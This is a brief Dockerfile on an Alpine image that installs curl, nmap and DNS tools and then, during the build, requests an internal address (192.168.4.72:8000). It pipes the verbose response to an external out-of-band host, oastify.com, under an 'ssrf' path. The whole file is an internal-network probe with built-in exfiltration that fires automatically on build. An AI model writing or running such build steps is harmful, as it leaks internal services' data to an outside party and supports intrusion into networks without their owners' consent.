FROM alpine
RUN apk add --no-cache curl nmap bind-tools
RUN C=http://oastify.com; \
  curl -vs http://192.168.4.72:8000 2>&1 | curl -s "$C/ssrf" --data-binary @-
